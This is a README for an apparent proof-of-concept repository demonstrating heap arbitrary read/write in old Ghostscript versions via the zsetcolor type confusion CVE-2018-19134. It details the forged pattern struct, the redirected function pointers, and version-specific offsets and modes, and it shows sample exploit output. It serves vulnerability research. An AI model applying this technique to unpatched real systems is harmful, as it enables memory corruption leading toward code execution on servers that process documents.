# cve-2018-19134_ghostscript_arbitrary_rw_demo

Demonstrates arbitrary read/write over Ghostscript's heap by exploiting a type confusion in `zsetcolor` (CVE-2018-19134, fixed in Ghostscript 9.26).

## How it works

`zsetcolor` retrieves a pattern instance from a dictionary's "Implementation" field and casts it to `gs_pattern_instance_t *` without validating the ref type. By supplying a crafted PostScript array as the Implementation, the exploit controls the struct's `type` pointer, redirecting its `procs.get_pattern` and `procs.uses_base_space` function pointers to `zpop` and `zucache`.

`zpop` decrements `op_stack.stack.p` (osp) by `sizeof(ref)` = 16 bytes without dereferencing the pointed-to memory. `zucache` is a no-op. The exploit probes at runtime to find which ref index within the fake struct overlaps `osp`, then selects the appropriate exploitation technique:

**TAS mode** (GS 9.08–9.25): `osp` overlaps a ref's `type_attrs` field. Repeated `setpattern` calls subtract 16 from `type_attrs` until it wraps from `t_array` (4) to `t_string` (18), converting the array into a string whose `value.bytes` pointer still addresses the original ref storage — exposing it as raw bytes for direct byte-level read/write.

**VALUE mode** (GS 8.64–9.07): `osp` overlaps a ref's `value` field (the element pointer). Each `setpattern` call shifts the array's view backward over heap memory by `sizeof(ref)` per `zpop` call, providing ref-level read/write across object boundaries.

## Setup

Requires a Ghostscript version vulnerable to CVE-2018-19134 (fixed in 9.26). We use [ghostscript_version_graveyard](https://github.com/w0ot-net/ghostscript_version_graveyard) to run old Ghostscript versions via Docker.

Copy the example config and adjust paths if needed:

```bash
cp gs.conf.example gs.conf
```

`gs.conf` is gitignored so you can point it at your local graveyard checkout.

## Running

```bash
./run.sh
```

## Tested versions

| Version | Mode | op_stack.p offset | Result |
|---------|------|-------------------|--------|
| 8.63 | — | — | setpattern path does not reach vulnerable code |
| 8.64 | VALUE | pinst[31] (504) | arbitrary ref-level r/w |
| 9.01 | VALUE | pinst[38] (616) | arbitrary ref-level r/w |
| 9.14 | TAS | pinst[39] (624) | arbitrary byte-level r/w |
| 9.18 | TAS | pinst[39] (624) | arbitrary byte-level r/w |

The exploit auto-detects the correct offset and mode at runtime.

## Example output (GS 9.18, TAS mode)

```
CVE-2018-19134 type confusion succeeded after 1288 iterations.
Mode: TAS at pinst[39]  (byte offset 624)

=== ARBITRARY READ ===
Reading raw bytes of arr[0] ref struct (16 bytes):

  82 0F xx xx F6 02 00 00  xx xx xx xx xx xx 00 00

  Bytes 0-7  : type_attrs | pad | rsize  (ref header)
  Bytes 8-15 : value.opproc               (zput address)

Function pointer to zput: 0x0000xxxxxxxxxxxx

=== ARBITRARY WRITE ===
Writing DE AD BE EF at byte offset 32:

  Read-back: DE AD BE EF

=== RESULT ===
Arbitrary byte-level read/write over 32766 bytes of Ghostscript heap memory.
```

## Example output (GS 9.01, VALUE mode)

```
CVE-2018-19134 pointer-shift primitive established.
Mode: VALUE at pinst[38]  (byte offset 616)
Shift rate: 3 refs (48 bytes) per setpattern call

=== ARBITRARY WRITE ===
Writing integer 42424242 through shifted[3] (= arr[0]):

  Write via shifted pointer:  42424242
  Read-back via original arr: 42424242

=== ARBITRARY READ ===
Reading 3 refs (48 bytes) before arr's original storage:

  [arr - 1 ref]: int = 1337
  [arr - 2 ref]: int = 7331
  [arr - 3 ref]: int = 9999

=== RESULT ===
Arbitrary ref-level read/write over 524320 bytes of Ghostscript heap memory.
```

## Acknowledgments

Based on the research by Man Yue Mo: [Exploiting CVE-2018-19134: Ghostscript RCE through type confusion](https://securitylab.github.com/research/cve-2018-19134-ghostscript-rce/).
